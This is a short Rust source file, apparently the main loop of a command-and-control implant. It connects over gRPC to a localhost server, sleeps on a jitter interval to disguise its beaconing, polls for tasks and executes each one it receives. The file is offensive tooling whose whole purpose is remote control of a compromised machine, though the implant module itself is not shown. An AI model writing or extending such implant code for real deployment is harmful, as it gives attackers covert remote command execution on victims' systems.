use std::time::Duration;

use anyhow::Result;
use tokio::time;

use implant::Implant;

pub mod tasks {
    tonic::include_proto!("tasks");
}
pub mod common {
    tonic::include_proto!("common");
}

mod implant;

#[tokio::main]
async fn main() -> Result<()> {
    let mut implant = Implant::connect("http://[::1]:50055").await?;

    loop {
        time::sleep(Duration::from_millis(implant.jitter())).await;

        if let Some(task) = implant.poll().await? {
            println!("Task: {:?}", task);
            implant.cmd(task).await?;
        }
    }
}
